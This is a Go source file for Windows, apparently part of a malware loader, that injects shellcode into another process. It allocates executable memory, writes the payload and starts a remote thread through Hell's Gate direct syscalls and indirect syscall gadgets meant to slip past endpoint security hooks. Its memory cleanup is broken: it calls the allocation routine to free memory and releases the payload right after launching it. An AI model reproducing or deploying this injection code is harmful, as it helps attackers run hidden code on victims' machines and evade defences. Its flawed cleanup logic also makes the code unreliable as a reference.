//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// doNtCreateThreadEx completes full injection via NtCreateThreadEx syscall.
// Memory ops use Hell's Gate syscall stubs; thread creation uses NtCreateThreadEx.
func doNtCreateThreadEx(hProc uintptr, sc []byte) error {
	sm := newSyscallManager()
	defer sm.freeStubs()

	// NtAllocateVirtualMemory
	ntAllocVM, err := sm.getStub("NtAllocateVirtualMemory")
	if err != nil {
		return fmt.Errorf("syscall stub NtAllocateVirtualMemory: %w", err)
	}
	var allocAddr uintptr
	regionSize := uintptr(len(sc))
	r1, _, _ := syscall.Syscall6(ntAllocVM, 6,
		hProc,
		uintptr(unsafe.Pointer(&allocAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", r1)
	}

	// NtWriteVirtualMemory
	ntWriteVM, err := sm.getStub("NtWriteVirtualMemory")
	if err != nil {
		return fmt.Errorf("syscall stub NtWriteVirtualMemory: %w", err)
	}
	var written uint32
	r1, _, _ = syscall.Syscall6(ntWriteVM, 5,
		hProc,
		allocAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r1 != 0 {
		syscall.Syscall6(ntAllocVM, 4, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
	}

	// NtCreateThreadEx via syscall
	hThread, err := syscallNtCreateThreadEx(sm, hProc, allocAddr)
	if err != nil {
		return err
	}
	syscall.Syscall6(ntAllocVM, 4, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
	procCloseHandle.Call(hThread)
	return nil
}

// doNtCreateThreadExIndirect uses INDIRECT syscall stubs (calls through ntdll's own syscall;ret gadget)
func doNtCreateThreadExIndirect(hProc uintptr, sc []byte) error {
	sm := newSyscallManager()
	defer sm.freeStubs()

	ntAllocVM, err := sm.getIndirectStub("NtAllocateVirtualMemory")
	if err != nil {
		return doNtCreateThreadEx(hProc, sc)
	}
	ntWriteVM, err := sm.getIndirectStub("NtWriteVirtualMemory")
	if err != nil {
		return doNtCreateThreadEx(hProc, sc)
	}

	var allocAddr uintptr
	regionSize := uintptr(len(sc))
	r1, _, _ := syscall.Syscall6(ntAllocVM, 6,
		hProc,
		uintptr(unsafe.Pointer(&allocAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory indirect failed: 0x%X", r1)
	}

	var written uint32
	r1, _, _ = syscall.Syscall6(ntWriteVM, 5,
		hProc,
		allocAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory indirect failed: 0x%X", r1)
	}

	hThread, err := syscallNtCreateThreadEx(sm, hProc, allocAddr)
	if err != nil {
		return err
	}
	procCloseHandle.Call(hThread)
	return nil
}
